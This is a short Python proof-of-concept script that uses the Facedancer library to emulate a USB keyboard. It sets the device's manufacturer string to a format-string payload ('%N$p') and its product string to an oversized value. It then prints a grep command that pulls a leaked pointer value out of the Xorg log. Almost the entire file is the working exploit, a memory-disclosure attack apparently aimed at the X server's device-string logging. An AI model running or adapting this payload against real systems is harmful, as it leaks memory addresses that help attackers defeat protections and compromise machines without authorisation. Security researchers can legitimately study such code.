#!/usr/bin/env python3
# pylint: disable=unused-wildcard-import, wildcard-import
#
import os
import sys
import asyncio
import logging
import uuid
from facedancer import main
from facedancer.devices.keyboard import USBKeyboardDevice

run_id = uuid.uuid4().bytes.hex()[:8]
idx = int(os.environ.get("RBPIDX", 46))
payload = f"[[<{run_id}> param index {idx}: %{idx}$p ]]"
serial = "A"*48
product = "Z"*120
manu = payload

# create the device and connect
DEVICE = USBKeyboardDevice()
DEVICE.serial_number_string = serial
DEVICE.manufacturer_string = manu
DEVICE.product_string = product
DEVICE.product_id = 0x1337
DEVICE.vendor_id = 0x1337

async def custom_main():
    DEVICE.connect()
    # Sanity check to avoid common issues.
    if len(DEVICE.configurations) == 0:
        logging.error("No configurations defined on the emulated device! "
                "Did you forget @use_inner_classes_automatically?")

    if DEVICE.backend is None:
        DEVICE.connect()

    # Constantly service any events that need to be performed.
    x = 0
    while True:
        DEVICE.backend.service_irqs()
        await asyncio.sleep(0)
        x += 1
        if x > 15000:
            break
    DEVICE.disconnect()

print(f"[+] Connecting device, please wait....")
asyncio.run(custom_main())
print(f"[+] Find leaked value with: `grep -m 1 -E \"{run_id}.*0x7ff.*\" /var/log/Xorg.0.log | cut -d \" \" -f 10`")

# main(DEVICE)
